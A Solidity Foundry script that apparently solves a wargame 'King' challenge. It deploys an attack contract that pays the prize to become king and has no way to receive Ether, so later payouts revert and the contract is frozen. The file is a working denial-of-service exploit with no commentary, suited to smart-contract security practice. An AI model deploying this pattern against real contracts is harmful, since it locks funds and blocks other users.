// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import {King} from "../src/King.sol";

contract Attack {
    King public king;
    constructor(address payable kingAddress) payable {
        (bool ok,) = kingAddress.call{value: msg.value}("");
        require(ok, "call failed");
    }
}

contract KingScript is Script {
    King public kingContract;

    function setUp() public {
        kingContract = King(payable(vm.envAddress("KING_CONTRACT")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint prize = kingContract.prize();
        Attack attack = new Attack{value: prize}(payable(kingContract));
        vm.stopBroadcast();
    }
}
